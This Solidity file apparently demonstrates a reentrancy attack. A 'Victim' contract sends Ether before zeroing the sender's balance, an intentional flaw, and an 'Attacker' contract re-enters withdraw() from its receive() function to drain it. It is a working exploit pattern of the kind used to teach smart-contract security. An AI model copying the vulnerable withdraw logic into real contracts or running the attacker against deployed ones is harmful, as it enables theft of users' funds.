// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Victim {
    mapping(address => uint256) public balances;
    //Everybody can deposit Ether
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        // We should have money at this contract for withdraw money 
        require(amount > 0, "Insufficient balance");
        // We can withdraw the same money we have deposited
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
        // The balance of receiver must set zero after transferring
        balances[msg.sender] = 0;
    }
}

contract Attacker {
    // victim is an Instance of Victim contract
    Victim public victim;
    constructor(Victim _etherStoreAddress) {
        // Initializing of victim instance with the input address
        victim = _etherStoreAddress;
    }
    // Calling deposit and withdraw methods of Victim contract
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }
    // withdraw method of Victim can be called every time after receiving the money 
    // until the balance is zero
    receive() external payable {
        if (address(victim).balance >= msg.value) {
            victim.withdraw();
        }
    }
}


